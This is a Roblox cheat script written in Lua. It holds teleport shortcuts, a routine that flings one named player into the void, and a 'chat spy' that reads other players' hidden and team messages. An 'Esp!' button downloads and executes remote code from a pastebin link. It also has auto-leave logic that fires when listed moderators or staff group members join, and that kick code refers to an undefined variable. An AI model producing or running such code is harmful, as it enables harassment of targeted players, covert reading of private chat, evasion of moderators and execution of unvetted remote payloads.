CreateTeleport("RPG", 115, -28, -275)
CreateTeleport("armors", -1180, 29, -488)
CreateTeleport("Flame", -153.5, 55, -100)
CreateTeleport("police", -267, 20, -95)
CreateTeleport("fitness", -75, 20, -635)
CreateTeleport("Grenade", -960, 0, 470)
CreateTeleport("Church", 206, 25, -95)
CreateTeleport("Gun1", 481.5, 47, -600)
CreateTeleport("Gun2", -560, 10, -736)
CreateTeleport("roof2", -436, 80, -219)
CreateTeleport("playground", -296, 105, -711)
CreateTeleport("basketball", -929, 27, -445)

Create("Void!", function()
local playerName = "xBlur2502"
local teleportCoordinates = Vector3.new(5000, 24000, 5000)

local function teleportAndDrop(player)
    if player.Name == playerName then
        local originalPosition = player.Character.HumanoidRootPart.Position
        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportCoordinates)
        wait(0.5)
        -- Trigger the MainEvent to drop the player
        local mainEvent = game.ReplicatedStorage.MainEvent
        mainEvent:FireServer("Grabbing", false)
        wait(0.2)
        -- Return to the original position
        player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == playerName then
        teleportAndDrop(player)
    end
end)

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == playerName then
        teleportAndDrop(player)
    end
end
end)

Create("Esp!", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/qXhWm4Df'))()
end)

-- ChatSpy Initialization
if getgenv().ChatSpy then return getgenv().ChatSpy end
repeat wait() until game:GetService("ContentProvider").RequestQueueSize == 0
repeat wait() until game:IsLoaded()

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = DefaultChatSystemChatEvents:WaitForChild("SayMessageRequest")
local OnMessageDoneFiltering = DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering")

getgenv().ChatSpy = {
    Enabled = true,
    SpyOnSelf = true,
    Public = false,
    Chat = {Colour = Color3.fromRGB(255, 0, 0), Font = Enum.Font.SourceSans, TextSize = 18, Text = ""},
    IgnoreList = {
        {Message = ":part/1/1/1", ExactMatch = true},
        {Message = ":part/10/10/10", ExactMatch = true},
        {Message = "A?????????", ExactMatch = false},
        {Message = ":colorshifttop 10000 0 0", ExactMatch = true},
        {Message = ":colorshiftbottom 10000 0 0", ExactMatch = true},
        {Message = ":colorshifttop 0 10000 0", ExactMatch = true},
        {Message = ":colorshiftbottom 0 10000 0", ExactMatch = true},
        {Message = ":colorshifttop 0 0 10000", ExactMatch = true},
        {Message = ":colorshiftbottom 0 0 10000", ExactMatch = true},
    },
}

-- Functions
local function checkIgnored(message)
    for _, v in ipairs(ChatSpy.IgnoreList) do
        if (v.ExactMatch and message == v.Message) or (not v.ExactMatch and string.match(message, v.Message)) then 
            return true
        end
    end
    return false
end

local function onChatted(targetPlayer, message)
    if targetPlayer == LocalPlayer and string.lower(message):sub(1, 4) == "/spy" then
        ChatSpy.Enabled = not ChatSpy.Enabled wait(0.3)
        ChatSpy.Chat.Text = "[SPY] - " .. (ChatSpy.Enabled and "Enabled." or "Disabled.")
        StarterGui:SetCore("ChatMakeSystemMessage", ChatSpy.Chat)
    elseif ChatSpy.Enabled and (ChatSpy.SpyOnSelf or targetPlayer ~= LocalPlayer) then
        message = message:gsub("[\n\r]", ''):gsub("\t", ' '):gsub(" +", ' ')
        local Hidden = true
        local Connection = OnMessageDoneFiltering.OnClientEvent:Connect(function(packet, channel)
            if packet.SpeakerUserId == targetPlayer.UserId and packet.Message == message:sub(-#packet.Message) and 
            (channel == "All" or (channel == "Team" and not ChatSpy.Public and Players[packet.FromSpeaker].Team == LocalPlayer.Team)) then
                Hidden = false
            end
        end)
        wait(1)
        Connection:Disconnect()
        if Hidden and ChatSpy.Enabled and not checkIgnored(message) then
            if #message > 1200 then message = message:sub(1, 1200) .. "..." end
            ChatSpy.Chat.Text = "[SPY] - [" .. targetPlayer.Name .. "]: " .. message
            if ChatSpy.Public then SayMessageRequest:FireServer(ChatSpy.Chat.Text, "All") else StarterGui:SetCore("ChatMakeSystemMessage", ChatSpy.Chat) end
        end
    end
end

-- Handling Chats
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message) onChatted(player, message) end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message) onChatted(player, message) end)
end)

-- Initialize Text
ChatSpy.Chat.Text = "[SPY] - " .. (ChatSpy.Enabled and "Enabled." or "Disabled.")
StarterGui:SetCore("ChatMakeSystemMessage", ChatSpy.Chat)

-- Update Chat Frame
local chatFrame = LocalPlayer.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(0, chatFrame.ChatChannelParentFrame.Size.Y)

wait(0.1)

-- Player kick on mod join
local modNames = {"512f6", "JokeTheFool", "Sherosama", "Papa_Mbaye", "AStrongMuscle", "streetren", "NikoSenpai", "WashedGarage", "iumu", "Benoxa", "Luutyy", "clubstar54", "givkitheth", "kywiexcx", "ATKDrizzy", "dtbbullet", "XavierWildYT", "RogueDaHoodKing", "paxxythecreator", "NatsuDBlaze", "AnqelicMar", "DrBlakMD", "DarkWhirlwind", "coreten", "LegacyCross", "Greed_Ocean"}

game.Players.PlayerAdded:Connect(function(plr)
    for _, v in ipairs(modNames) do
        if plr.Name == v then
            player:Kick("A Mod Has Joined")
        end
    end
end)

wait(0.1)

-- Define group IDs
local group1, group2, group3 = 8068202, 10604500, 10878346

-- Function to check group membership and kick
local function checkAndKick()
    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and (otherPlayer:IsInGroup(group1) or otherPlayer:IsInGroup(group2) or otherPlayer:IsInGroup(group3)) then
            local kickMessage = "A mod has joined: " .. otherPlayer.Name
            player:Kick(kickMessage)
            break
        end
    end
end

-- Function to handle new players joining
local function onPlayerAdded(newPlayer)
    if newPlayer:IsInGroup(group1) or newPlayer:IsInGroup(group2) or newPlayer:IsInGroup(group3) then
        local kickMessage = "A mod has joined: " .. newPlayer.Name
        player:Kick(kickMessage)
    end
end

-- Connect the function to the PlayerAdded event
game.Players.PlayerAdded:Connect(onPlayerAdded)

-- Check for players already in the game when the script runs
checkAndKick()
